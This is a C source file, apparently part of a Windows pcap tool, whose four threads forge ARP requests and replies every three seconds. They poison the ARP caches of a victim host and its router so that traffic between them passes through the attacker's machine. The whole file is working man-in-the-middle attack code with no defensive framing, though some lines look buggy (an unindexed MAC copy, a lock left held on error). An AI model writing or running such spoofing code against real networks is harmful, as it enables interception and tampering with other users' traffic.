#include"IPscan.h"

BOOL rel_flag = TRUE;
a_info info;
t_info target;
pcap_t *fp;
u_char *data;
int n_target = 0;

DWORD WINAPI sending_vic_request(void *arg) {

	int i, j;
	char buf[32] = { 0, };
	u_char *vic_data_request = (u_char*)malloc(sizeof(u_char) * ARP_HEADER_LEN);
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	while (rel_flag) Sleep(1000);
	setSniffingData(FALSE, info, target, n_target);
	for (i = 0; i < ARP_HEADER_LEN; i++) *(vic_data_request + i) = *(data + i);
	while (1) {
		if (rel_flag) break;
		EnterCriticalSection(&crt);
		eh = (struct libnet_ethernet_hdr *)vic_data_request;
		ah = (struct libnet_arp_hdr *)vic_data_request;

		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = target.target_mac[n_target][i];
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data_request + i) = info.Router_Mac[j];
		vic_data_request += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		*(vic_data_request + 1) = ARPOP_REQUEST;
		vic_data_request += sizeof(ah->ar_op);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = info.Host_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(vic_data_request + i) = info.Router_Ip[j];
		vic_data_request += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_request + i) = 0x00;
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(vic_data_request + i) = target.target_ip[n_target][j];
		vic_data_request -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		if (pcap_sendpacket(fp, vic_data_request, ARP_HEADER_LEN) != 0) {
			printf("Error\n");
			return -1;
		}
		LeaveCriticalSection(&crt);
		Sleep(3000);
	}
	free(vic_data_request);
	return 0;
}

DWORD WINAPI sending_vic_reply(void *arg) {

	int i, j;
	char buf[32] = { 0, };
	u_char *vic_data_reply = (u_char*)malloc(sizeof(u_char) * ARP_HEADER_LEN);
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	while (rel_flag) Sleep(1000);
	for (i = 0; i < ARP_HEADER_LEN; i++) *(vic_data_reply + i) = *(data + i);
	while (1) {
		if (rel_flag) break;
		EnterCriticalSection(&crt);
		eh = (struct libnet_ethernet_hdr *)vic_data_reply;
		ah = (struct libnet_arp_hdr *)vic_data_reply;

		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_reply + i) = target.target_mac[n_target][i];
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(vic_data_reply + i) = info.Host_Mac[j];
		vic_data_reply += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		*(vic_data_reply + 1) = ARPOP_REPLY;
		vic_data_reply += sizeof(ah->ar_op);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_reply + i) = info.Host_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(vic_data_reply + i) = info.Router_Ip[j];
		vic_data_reply += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(vic_data_reply + i) = target.target_mac[n_target][i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(vic_data_reply + i) = target.target_ip[n_target][j];
		vic_data_reply -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		if (pcap_sendpacket(fp, vic_data_reply, ARP_HEADER_LEN) != 0) {
			printf("Error\n");
			return -1;
		}
		LeaveCriticalSection(&crt);
		Sleep(3000);
	}
	free(vic_data_reply);
	return 0;
}

DWORD WINAPI sending_rou_request(void *arg) {

	int i, j;
	char buf[32] = { 0, };
	u_char *rou_data_request = (u_char*)malloc(sizeof(u_char) * ARP_HEADER_LEN);
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	while (rel_flag) Sleep(1000);
	for (i = 0; i < ARP_HEADER_LEN; i++) *(rou_data_request + i) = *(data + i);
	while (1) {
		if (rel_flag) break;
		EnterCriticalSection(&crt);
		eh = (struct libnet_ethernet_hdr *)rou_data_request;
		ah = (struct libnet_arp_hdr *)rou_data_request;

		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data_request + i) = info.Router_Mac;
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(rou_data_request + i) = info.Host_Mac[j];
		rou_data_request += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		*(rou_data_request + 1) = ARPOP_REQUEST;
		rou_data_request += sizeof(ah->ar_op);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data_request + i) = info.Host_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(rou_data_request + i) = target.target_ip[n_target][j];
		rou_data_request += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data_request + i) = 0x00;
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(rou_data_request + i) = info.Router_Ip[j];
		rou_data_request -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		if (pcap_sendpacket(fp, rou_data_request, ARP_HEADER_LEN) != 0) {
			printf("Error\n");
			return -1;
		}
		LeaveCriticalSection(&crt);
		Sleep(3000);
	}
	free(rou_data_request);
	return 0;
}

DWORD WINAPI sending_rou_reply(void *arg) {

	int i, j;
	char buf[32] = { 0, };
	u_char *rou_data = (u_char *)malloc(sizeof(u_char) * ARP_HEADER_LEN);
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;
	while (rel_flag) Sleep(1000);
	for (i = 0; i < ARP_HEADER_LEN; i++) *(rou_data + i) = *(data + i);
	while (1) {
		if (rel_flag) break;
		EnterCriticalSection(&crt);
		eh = (struct libnet_ethernet_hdr *)rou_data;
		ah = (struct libnet_arp_hdr *)rou_data;

		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data + i) = info.Router_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(rou_data + i) = info.Host_Mac[j];
		rou_data += sizeof(*eh) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		*(rou_data + 1) = ARPOP_REPLY;
		rou_data += sizeof(ah->ar_op);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data + i) = info.Host_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_spa); i++, j++) *(rou_data + i) = target.target_ip[n_target][j];
		rou_data += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
		for (i = 0; i < ETHER_ADDR_LEN; i++) *(rou_data + i) = info.Router_Mac[i];
		for (j = 0; i < ETHER_ADDR_LEN + sizeof(ah->ar_tpa); j++, i++) *(rou_data + i) = info.Router_Ip[j];
		rou_data -= sizeof(*eh) + sizeof(ah->ar_sha) + sizeof(ah->ar_spa) + sizeof(ah->ar_op) + sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
		if (pcap_sendpacket(fp, rou_data, ARP_HEADER_LEN) != 0) {
			printf("Error\n");
			return -1;
		}
		LeaveCriticalSection(&crt);
		Sleep(3000);
	}
	free(rou_data);
	return 0;
}

void setSendingFlag(BOOL flag, u_char *pkt, int num) {
	rel_flag = flag;
	data = pkt;
	n_target = num;
}

void setpcapData_relay(pcap_t *return_fp, a_info return_info) {
	fp = return_fp;
	info = return_info;
}

void setTargetList(t_info return_target) {
	target = return_target;
}